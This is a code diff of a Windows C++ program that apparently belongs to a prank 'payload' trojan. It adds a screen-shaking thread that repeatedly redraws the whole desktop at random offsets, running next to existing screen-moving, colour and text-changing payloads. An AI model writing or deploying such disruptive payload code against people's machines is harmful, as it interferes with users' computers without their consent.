@@ -1,4 +1,4 @@
-﻿#include "Include.h"
+#include "Include.h"
 
 
 extern "C"
@@ -106,6 +106,19 @@ int payloadChangeText() {
 		return 1;
 }
 
+int scrshake(std::atomic<bool>& quit_flag) {
+	while (!quit_flag) {
+		HDC _h = GetDC(0);
+		int x = SM_CXSCREEN;
+		int y = SM_CYSCREEN;
+		int w = GetSystemMetrics(0);
+		int h = GetSystemMetrics(1);
+		BitBlt(_h, rand() % 5, rand() % 5, w, h, _h, rand() % 5, rand() % 5, SRCCOPY);
+		Sleep(10);
+	}
+	return 1;
+}
+
 
 
 int main(void) {
@@ -114,9 +127,11 @@ int main(void) {
 	Sleep(10);
 	std::atomic_bool quit_flag(false);
 	std::atomic_bool delayed_quit_flag(false);
+	std::atomic_bool ddelayed_quit_flag(false);
 	srand((unsigned int)time(NULL));
 	thread a(ScrMove, std::ref(quit_flag));
 	thread b(rainb, std::ref(delayed_quit_flag));
+	thread c(scrshake, std::ref(ddelayed_quit_flag));
 	Sleep(10000);
 	quit_flag = true;
 	for (int i = 0; i < 20; i++) {
@@ -126,8 +141,9 @@ int main(void) {
 		 y = rand() % (1080);
 		payloadChangeText();
 	}
-
 	delayed_quit_flag = true;
+	Sleep(10000);
+	ddelayed_quit_flag = true;
 
 	BOOLEAN bl;
 	unsigned long response;
